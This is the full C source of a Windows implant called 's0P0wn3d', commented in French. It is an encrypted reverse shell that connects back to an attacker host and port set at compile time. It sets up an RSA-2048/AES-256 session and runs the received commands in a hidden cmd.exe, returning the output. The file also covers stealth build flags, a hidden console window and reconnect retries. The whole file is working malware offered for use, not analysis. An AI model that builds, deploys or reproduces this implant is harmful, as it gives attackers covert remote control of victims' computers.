/*
 * s0P0wn3d — Implant C (reverse shell chiffré)
 *
 * Chiffrement : RSA-2048 (échange de clé) + AES-256-CBC (données)
 * Cible       : Windows 10+ (x86-64)
 * Compilation : x86_64-w64-mingw32-gcc -o implant.exe main.c
 *               -DCLIENT_IP=\"<ip>\" -DCLIENT_PORT=<port>
 *               -DWAIT_FOR_CLIENT -lws2_32 -lbcrypt
 *               -mwindows -static -s -O2
 *
 * MITRE ATT&CK :
 *   T1059.003 — Windows Command Shell
 *   T1071.001 — Application Layer Protocol
 *   T1573.002 — Asymmetric Cryptography
 */

/* winsock2.h doit être inclus AVANT windows.h */
#include <winsock2.h>
#include <windows.h>
#include <bcrypt.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Pour MSVC uniquement — MinGW utilise -lbcrypt -lws2_32 */
#ifdef _MSC_VER
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "ws2_32.lib")
#endif

/* ================================================================
 * Paramètres de compilation
 * ================================================================ */

#if !defined(CLIENT_IP) || !defined(CLIENT_PORT)
#define CLIENT_IP   (char *)"0.0.0.0"
#define CLIENT_PORT (int)0
#endif

/* ================================================================
 * Clé de session AES-256
 *
 * Générée aléatoirement à chaque connexion (BCryptGenRandom),
 * puis transmise au serveur chiffrée avec sa clé publique RSA-2048
 * (RSA-OAEP-SHA256). Elle ne transite jamais en clair.
 * ================================================================ */

static uint8_t SESSION_KEY[32];

/* ================================================================
 * AES-256-CBC — implémentation embarquée (tiny-AES-c)
 * Aucune dépendance externe.
 * ================================================================ */

#define AES_BLOCKLEN    16
#define AES_KEYLEN      32
#define AES_keyExpSize  240
#define Nb  4
#define Nk  8
#define Nr  14

typedef uint8_t  state_t[4][4];

typedef struct {
    uint8_t RoundKey[AES_keyExpSize];
    uint8_t Iv[AES_BLOCKLEN];
} AES_ctx;

/* Tables de substitution AES (FIPS 197) */
static const uint8_t sbox[256] = {
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5,
    0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0,
    0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc,
    0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a,
    0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0,
    0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b,
    0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85,
    0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5,
    0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17,
    0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88,
    0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c,
    0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9,
    0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6,
    0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e,
    0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94,
    0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68,
    0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
};

static const uint8_t rsbox[256] = {
    0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38,
    0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb,
    0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87,
    0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb,
    0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d,
    0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e,
    0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2,
    0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25,
    0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16,
    0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92,
    0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda,
    0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84,
    0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a,
    0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06,
    0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02,
    0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b,
    0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea,
    0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73,
    0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85,
    0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e,
    0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89,
    0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b,
    0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20,
    0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4,
    0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31,
    0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f,
    0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d,
    0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef,
    0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0,
    0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61,
    0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26,
    0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d
};

static const uint8_t Rcon[11] = {
    0x8d, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36
};

/* ── Primitives GF(2^8) ─────────────────────────────────────── */

static uint8_t xtime(uint8_t x)
{
    return (x << 1) ^ (((x >> 7) & 1) * 0x1b);
}

/*
 * Multiplication dans GF(2^8).
 * Remplace la fonction imbriquée GCC (extension non-standard).
 */
static uint8_t gmul(uint8_t a, uint8_t b)
{
    uint8_t result = 0;
    for (int i = 0; i < 8; i++) {
        if (b & 1)
            result ^= a;
        uint8_t hi = a & 0x80;
        a <<= 1;
        if (hi)
            a ^= 0x1b;
        b >>= 1;
    }
    return result;
}

/* ── Expansion de clé ───────────────────────────────────────── */

static void KeyExpansion(uint8_t *RoundKey, const uint8_t *Key)
{
    unsigned i, j, k;
    uint8_t  t[4];

    for (i = 0; i < Nk; i++) {
        RoundKey[i * 4]     = Key[i * 4];
        RoundKey[i * 4 + 1] = Key[i * 4 + 1];
        RoundKey[i * 4 + 2] = Key[i * 4 + 2];
        RoundKey[i * 4 + 3] = Key[i * 4 + 3];
    }

    for (i = Nk; i < Nb * (Nr + 1); i++) {
        k    = (i - 1) * 4;
        t[0] = RoundKey[k];
        t[1] = RoundKey[k + 1];
        t[2] = RoundKey[k + 2];
        t[3] = RoundKey[k + 3];

        if (i % Nk == 0) {
            uint8_t u = t[0];
            t[0] = sbox[t[1]] ^ Rcon[i / Nk];
            t[1] = sbox[t[2]];
            t[2] = sbox[t[3]];
            t[3] = sbox[u];
        } else if (i % Nk == 4) {
            t[0] = sbox[t[0]];
            t[1] = sbox[t[1]];
            t[2] = sbox[t[2]];
            t[3] = sbox[t[3]];
        }

        j = i * 4;
        k = (i - Nk) * 4;
        RoundKey[j]     = RoundKey[k]     ^ t[0];
        RoundKey[j + 1] = RoundKey[k + 1] ^ t[1];
        RoundKey[j + 2] = RoundKey[k + 2] ^ t[2];
        RoundKey[j + 3] = RoundKey[k + 3] ^ t[3];
    }
}

static void AES_init_ctx_iv(AES_ctx *ctx, const uint8_t *key, const uint8_t *iv)
{
    KeyExpansion(ctx->RoundKey, key);
    memcpy(ctx->Iv, iv, AES_BLOCKLEN);
}

/* ── Transformations AES ────────────────────────────────────── */

static void AddRoundKey(uint8_t round, state_t *s, const uint8_t *K)
{
    for (int i = 0; i < 4; i++)
        for (int j = 0; j < 4; j++)
            (*s)[i][j] ^= K[round * Nb * 4 + i * Nb + j];
}

static void SubBytes(state_t *s)
{
    for (int i = 0; i < 4; i++)
        for (int j = 0; j < 4; j++)
            (*s)[j][i] = sbox[(*s)[j][i]];
}

static void ShiftRows(state_t *s)
{
    uint8_t t;

    /* Ligne 1 : rotation gauche de 1 */
    t = (*s)[0][1]; (*s)[0][1] = (*s)[1][1];
    (*s)[1][1] = (*s)[2][1]; (*s)[2][1] = (*s)[3][1]; (*s)[3][1] = t;

    /* Ligne 2 : rotation gauche de 2 */
    t = (*s)[0][2]; (*s)[0][2] = (*s)[2][2]; (*s)[2][2] = t;
    t = (*s)[1][2]; (*s)[1][2] = (*s)[3][2]; (*s)[3][2] = t;

    /* Ligne 3 : rotation gauche de 3 */
    t = (*s)[0][3]; (*s)[0][3] = (*s)[3][3];
    (*s)[3][3] = (*s)[2][3]; (*s)[2][3] = (*s)[1][3]; (*s)[1][3] = t;
}

static void MixColumns(state_t *s)
{
    for (int i = 0; i < 4; i++) {
        uint8_t a = (*s)[i][0];
        uint8_t b = (*s)[i][1];
        uint8_t c = (*s)[i][2];
        uint8_t d = (*s)[i][3];
        uint8_t T = a ^ b ^ c ^ d;

        (*s)[i][0] ^= xtime(a ^ b) ^ T;
        (*s)[i][1] ^= xtime(b ^ c) ^ T;
        (*s)[i][2] ^= xtime(c ^ d) ^ T;
        (*s)[i][3] ^= xtime(d ^ a) ^ T;
    }
}

static void Cipher(state_t *s, const uint8_t *K)
{
    AddRoundKey(0, s, K);
    for (int r = 1; r < Nr; r++) {
        SubBytes(s);
        ShiftRows(s);
        MixColumns(s);
        AddRoundKey(r, s, K);
    }
    SubBytes(s);
    ShiftRows(s);
    AddRoundKey(Nr, s, K);
}

static void InvSubBytes(state_t *s)
{
    for (int i = 0; i < 4; i++)
        for (int j = 0; j < 4; j++)
            (*s)[j][i] = rsbox[(*s)[j][i]];
}

static void InvShiftRows(state_t *s)
{
    uint8_t t;

    t = (*s)[3][1]; (*s)[3][1] = (*s)[2][1];
    (*s)[2][1] = (*s)[1][1]; (*s)[1][1] = (*s)[0][1]; (*s)[0][1] = t;

    t = (*s)[0][2]; (*s)[0][2] = (*s)[2][2]; (*s)[2][2] = t;
    t = (*s)[1][2]; (*s)[1][2] = (*s)[3][2]; (*s)[3][2] = t;

    t = (*s)[0][3]; (*s)[0][3] = (*s)[1][3];
    (*s)[1][3] = (*s)[2][3]; (*s)[2][3] = (*s)[3][3]; (*s)[3][3] = t;
}

static void InvMixColumns(state_t *s)
{
    for (int i = 0; i < 4; i++) {
        uint8_t a = (*s)[i][0];
        uint8_t b = (*s)[i][1];
        uint8_t c = (*s)[i][2];
        uint8_t d = (*s)[i][3];

        (*s)[i][0] = gmul(a, 0x0e) ^ gmul(b, 0x0b) ^ gmul(c, 0x0d) ^ gmul(d, 0x09);
        (*s)[i][1] = gmul(a, 0x09) ^ gmul(b, 0x0e) ^ gmul(c, 0x0b) ^ gmul(d, 0x0d);
        (*s)[i][2] = gmul(a, 0x0d) ^ gmul(b, 0x09) ^ gmul(c, 0x0e) ^ gmul(d, 0x0b);
        (*s)[i][3] = gmul(a, 0x0b) ^ gmul(b, 0x0d) ^ gmul(c, 0x09) ^ gmul(d, 0x0e);
    }
}

static void InvCipher(state_t *s, const uint8_t *K)
{
    AddRoundKey(Nr, s, K);
    for (int r = Nr - 1; r > 0; r--) {
        InvShiftRows(s);
        InvSubBytes(s);
        AddRoundKey(r, s, K);
        InvMixColumns(s);
    }
    InvShiftRows(s);
    InvSubBytes(s);
    AddRoundKey(0, s, K);
}

static void XorIv(uint8_t *buf, const uint8_t *iv)
{
    for (int i = 0; i < AES_BLOCKLEN; i++)
        buf[i] ^= iv[i];
}

static void AES_CBC_encrypt(AES_ctx *ctx, uint8_t *buf, size_t len)
{
    uint8_t *iv = ctx->Iv;

    for (size_t i = 0; i < len; i += AES_BLOCKLEN) {
        XorIv(buf, iv);
        Cipher((state_t *)buf, ctx->RoundKey);
        iv  = buf;
        buf += AES_BLOCKLEN;
    }
    memcpy(ctx->Iv, iv, AES_BLOCKLEN);
}

static void AES_CBC_decrypt(AES_ctx *ctx, uint8_t *buf, size_t len)
{
    uint8_t next_iv[AES_BLOCKLEN];

    for (size_t i = 0; i < len; i += AES_BLOCKLEN) {
        memcpy(next_iv, buf, AES_BLOCKLEN);
        InvCipher((state_t *)buf, ctx->RoundKey);
        XorIv(buf, ctx->Iv);
        memcpy(ctx->Iv, next_iv, AES_BLOCKLEN);
        buf += AES_BLOCKLEN;
    }
}

/* ================================================================
 * Réseau — helpers bas niveau
 * ================================================================ */

/* Lecture bloquante de exactement n octets */
static int recv_all(SOCKET sock, uint8_t *buf, int n)
{
    int total = 0, received;

    while (total < n) {
        received = recv(sock, (char *)(buf + total), n - total, 0);
        if (received <= 0)
            return -1;
        total += received;
    }
    return total;
}

/*
 * Format d'un frame chiffré :
 *   [4B big-endian : total_len = 16 + len(ciphertext)]
 *   [16B           : IV aléatoire (BCryptGenRandom)]
 *   [?B            : AES-256-CBC ciphertext (PKCS#7)]
 */
static int send_enc(SOCKET sock, const uint8_t *data, int data_len)
{
    int     pad     = AES_BLOCKLEN - (data_len % AES_BLOCKLEN);
    int     padded_len = data_len + pad;
    uint8_t *buf    = (uint8_t *)malloc(padded_len);

    if (!buf)
        return -1;

    memcpy(buf, data, data_len);
    memset(buf + data_len, pad, pad);

    uint8_t iv[AES_BLOCKLEN];
    if (!BCRYPT_SUCCESS(BCryptGenRandom(NULL, iv, AES_BLOCKLEN,
                                        BCRYPT_USE_SYSTEM_PREFERRED_RNG))) {
        free(buf);
        return -1;
    }

    AES_ctx ctx;
    AES_init_ctx_iv(&ctx, SESSION_KEY, iv);
    AES_CBC_encrypt(&ctx, buf, padded_len);

    int     total_len = AES_BLOCKLEN + padded_len;
    uint8_t hdr[4]   = {
        (total_len >> 24) & 0xFF,
        (total_len >> 16) & 0xFF,
        (total_len >>  8) & 0xFF,
         total_len        & 0xFF
    };

    send(sock, (char *)hdr, 4,            0);
    send(sock, (char *)iv,  AES_BLOCKLEN, 0);
    send(sock, (char *)buf, padded_len,   0);
    free(buf);
    return 0;
}

/* Retourne les données déchiffrées (à libérer avec free), NULL si erreur */
static uint8_t *recv_dec(SOCKET sock, int *out_len)
{
    uint8_t hdr[4];

    if (recv_all(sock, hdr, 4) < 0)
        return NULL;

    int total_len = (hdr[0] << 24) | (hdr[1] << 16) | (hdr[2] << 8) | hdr[3];
    if (total_len <= 16 || total_len > 65536)
        return NULL;

    uint8_t *payload = (uint8_t *)malloc(total_len);
    if (!payload)
        return NULL;

    if (recv_all(sock, payload, total_len) < 0) {
        free(payload);
        return NULL;
    }

    uint8_t *iv         = payload;
    uint8_t *ciphertext = payload + AES_BLOCKLEN;
    int      cipher_len = total_len - AES_BLOCKLEN;

    AES_ctx ctx;
    AES_init_ctx_iv(&ctx, SESSION_KEY, iv);
    AES_CBC_decrypt(&ctx, ciphertext, cipher_len);

    int pad = ciphertext[cipher_len - 1];
    if (pad <= 0 || pad > AES_BLOCKLEN)
        pad = 0;

    *out_len     = cipher_len - pad;
    uint8_t *res = (uint8_t *)malloc(*out_len + 1);
    memcpy(res, ciphertext, *out_len);
    res[*out_len] = 0;

    free(payload);
    return res;
}

/* ================================================================
 * Handshake RSA-2048
 *
 * 1. Serveur → Implant : [4B blob_len][BCRYPT_RSAPUBLIC_BLOB]
 * 2. Implant génère SESSION_KEY (32B aléatoires)
 * 3. Implant chiffre SESSION_KEY avec RSA-OAEP-SHA256
 * 4. Implant → Serveur : [4B enc_len][SESSION_KEY chiffrée]
 *
 * Après le handshake, SESSION_KEY est partagée sans avoir
 * jamais transité en clair sur le réseau.
 * ================================================================ */

static int rsa_handshake(SOCKET sock)
{
    /* Étape 1 : recevoir la clé publique RSA */
    uint8_t hdr[4];
    if (recv_all(sock, hdr, 4) < 0)
        return -1;

    int blob_len = (hdr[0] << 24) | (hdr[1] << 16) | (hdr[2] << 8) | hdr[3];
    if (blob_len <= 24 || blob_len > 4096)
        return -1;

    uint8_t *blob = (uint8_t *)malloc(blob_len);
    if (!blob)
        return -1;

    if (recv_all(sock, blob, blob_len) < 0) {
        free(blob);
        return -1;
    }

    /* Étape 2 : générer la SESSION_KEY AES-256 */
    if (!BCRYPT_SUCCESS(BCryptGenRandom(NULL, SESSION_KEY, 32,
                                        BCRYPT_USE_SYSTEM_PREFERRED_RNG))) {
        free(blob);
        return -1;
    }

    /* Étape 3 : importer la clé publique et chiffrer SESSION_KEY */
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS          st;

    st = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RSA_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(st)) {
        free(blob);
        return -1;
    }

    /*
     * BCRYPT_RSAPUBLIC_BLOB (format attendu par BCryptImportKeyPair) :
     *   { ULONG Magic; ULONG BitLength;
     *     ULONG cbPublicExp; ULONG cbModulus;
     *     ULONG cbPrime1=0; ULONG cbPrime2=0; }
     *   + [cbPublicExp octets : exposant big-endian]
     *   + [cbModulus   octets : modulus big-endian]
     * Construit côté serveur Python avant envoi.
     */
    st = BCryptImportKeyPair(hAlg, NULL, BCRYPT_RSAPUBLIC_BLOB,
                             &hKey, blob, (ULONG)blob_len, 0);
    free(blob);

    if (!BCRYPT_SUCCESS(st)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return -1;
    }

    /*
     * RSA-OAEP-SHA256 : mêmes paramètres que côté Python :
     *   padding.OAEP(mgf=MGF1(SHA256()), algorithm=SHA256())
     */
    BCRYPT_OAEP_PADDING_INFO oaep = { BCRYPT_SHA256_ALGORITHM, NULL, 0 };
    ULONG enc_len = 0;

    /* Premier appel : obtenir la taille du ciphertext */
    st = BCryptEncrypt(hKey, SESSION_KEY, 32, &oaep,
                       NULL, 0, NULL, 0, &enc_len, BCRYPT_PAD_OAEP);
    if (!BCRYPT_SUCCESS(st)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return -1;
    }

    uint8_t *enc = (uint8_t *)malloc(enc_len);
    if (!enc) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return -1;
    }

    /* Deuxième appel : chiffrement effectif */
    st = BCryptEncrypt(hKey, SESSION_KEY, 32, &oaep,
                       NULL, 0, enc, enc_len, &enc_len, BCRYPT_PAD_OAEP);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    if (!BCRYPT_SUCCESS(st)) {
        free(enc);
        return -1;
    }

    /* Étape 4 : envoyer la SESSION_KEY chiffrée */
    uint8_t len_hdr[4] = {
        (enc_len >> 24) & 0xFF,
        (enc_len >> 16) & 0xFF,
        (enc_len >>  8) & 0xFF,
         enc_len        & 0xFF
    };
    send(sock, (char *)len_hdr, 4,        0);
    send(sock, (char *)enc,     enc_len,  0);
    free(enc);
    return 0;
}

/* ================================================================
 * Exécution de commande — pipe anonyme
 *
 * Pas de fichier temporaire, pas de console visible.
 * Stdout et stderr du process fils sont redirigés vers le pipe.
 * ================================================================ */

static char *exec_cmd(const char *cmd)
{
    char *out = (char *)malloc(65536);
    if (!out)
        return NULL;
    out[0] = 0;

    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hRead, hWrite;

    if (!CreatePipe(&hRead, &hWrite, &sa, 65536)) {
        strcpy(out, "[pipe_err]\r\n");
        return out;
    }
    /* Le read-end ne doit pas être hérité par le fils */
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    /* NUL pour stdin (pas de console avec -mwindows) */
    HANDLE hNul = CreateFileA("NUL", GENERIC_READ,
                              FILE_SHARE_READ | FILE_SHARE_WRITE,
                              &sa, OPEN_EXISTING, 0, NULL);

    /* Chemin absolu vers cmd.exe — évite les problèmes de PATH */
    char sysdir[MAX_PATH];
    char cmdline[8192];
    GetSystemDirectoryA(sysdir, MAX_PATH);
    snprintf(cmdline, sizeof(cmdline), "%s\\cmd.exe /C %s", sysdir, cmd);

    STARTUPINFOA si = { 0 };
    si.cb           = sizeof(si);
    si.dwFlags      = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow  = SW_HIDE;
    si.hStdInput    = (hNul != INVALID_HANDLE_VALUE) ? hNul : NULL;
    si.hStdOutput   = hWrite;
    si.hStdError    = hWrite;

    PROCESS_INFORMATION pi = { 0 };
    BOOL ok = CreateProcessA(NULL, cmdline, NULL, NULL,
                             TRUE, CREATE_NO_WINDOW,
                             NULL, NULL, &si, &pi);

    /* Fermer le write-end côté parent pour que ReadFile se termine */
    CloseHandle(hWrite);
    if (hNul != INVALID_HANDLE_VALUE)
        CloseHandle(hNul);

    if (!ok) {
        CloseHandle(hRead);
        snprintf(out, 64, "[exec_err %lu]\r\n", GetLastError());
        return out;
    }

    DWORD total = 0, rd;
    char  tmp[4096];
    while (ReadFile(hRead, tmp, sizeof(tmp), &rd, NULL) && rd > 0) {
        if (total + rd > 65533)
            break;
        memcpy(out + total, tmp, rd);
        total += rd;
    }
    out[total] = 0;

    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hRead);

    if (total == 0)
        strcpy(out, "[no output]\r\n");

    return out;
}

/* ================================================================
 * Boucle principale du shell
 * ================================================================ */

static void shell_loop(SOCKET sock)
{
    while (1) {
        int      cmd_len = 0;
        uint8_t *raw     = recv_dec(sock, &cmd_len);

        if (!raw)
            break;

        /* Copie et nettoyage des \r\n terminaux */
        char cmd[4096] = { 0 };
        int  len       = (cmd_len < 4095) ? cmd_len : 4095;
        memcpy(cmd, raw, len);
        free(raw);

        while (len > 0 && (cmd[len - 1] == '\r' || cmd[len - 1] == '\n'))
            cmd[--len] = 0;

        /* Commande vide : renvoyer une ligne vide */
        if (len == 0) {
            send_enc(sock, (uint8_t *)"\r\n", 2);
            continue;
        }

        char *out = exec_cmd(cmd);
        if (out) {
            send_enc(sock, (uint8_t *)out, (int)strlen(out));
            free(out);
        } else {
            send_enc(sock, (uint8_t *)"[error]\r\n", 9);
        }
    }
}

/* ================================================================
 * Point d'entrée
 * ================================================================ */

int main(void)
{
    /* Vérification des paramètres de compilation */
    if (strcmp(CLIENT_IP, "0.0.0.0") == 0 || CLIENT_PORT == 0)
        return 1;

    /* Masquer la fenêtre console si elle existe */
    HWND console = GetConsoleWindow();
    if (console)
        ShowWindow(console, SW_HIDE);

    /* Initialisation Winsock */
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        return 1;

    struct sockaddr_in server_addr;
    server_addr.sin_family      = AF_INET;
    server_addr.sin_port        = htons(CLIENT_PORT);
    server_addr.sin_addr.s_addr = inet_addr(CLIENT_IP);

    /*
     * Boucle de connexion.
     * Sans WAIT_FOR_CLIENT : une seule tentative.
     * Avec WAIT_FOR_CLIENT : retry toutes les 5s après déconnexion.
     */
    while (1) {
        SOCKET sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        if (sock == INVALID_SOCKET) {
            Sleep(5000);
            continue;
        }

        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) != 0) {
            closesocket(sock);
#ifndef WAIT_FOR_CLIENT
            break;
#endif
            Sleep(5000);
            continue;
        }

        /* Handshake RSA → remplit SESSION_KEY */
        if (rsa_handshake(sock) == 0)
            shell_loop(sock);

        closesocket(sock);

#ifndef WAIT_FOR_CLIENT
        break;
#endif
        Sleep(5000);
    }

    WSACleanup();
    return 0;
}
